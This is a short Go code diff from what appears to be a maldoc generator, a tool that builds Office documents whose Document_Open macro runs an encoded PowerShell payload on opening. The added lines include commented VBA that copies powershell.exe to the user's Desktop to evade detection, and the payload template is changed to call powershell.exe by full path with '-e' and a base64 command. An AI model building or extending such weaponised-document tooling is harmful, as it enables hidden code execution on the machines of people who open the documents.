@@ -12,6 +12,14 @@ func init() {
 	rand.Seed(time.Now().UTC().UnixNano())
 }
 
+// Dim from As String
+// from = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+// Dim too As String
+// Dim powershellCopy As String
+// too = Environ("USERPROFILE") & "\\Desktop\\powershellCopy.exe"
+
+// FileCopy from, too
+
 // DocumentOpen Document entry point
 var DocumentOpen string = `
 Private Sub Document_Open()
@@ -87,4 +95,4 @@ var Offset string = fmt.Sprint(rand.Intn(128))
 var Sep string = obf.RandStringBytes(3)
 
 // PSPayload Powershell payload, needs to be base64 UTF-16 encoded
-var PSPayload string = "powershell -e %s"
+var PSPayload string = `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e %s`
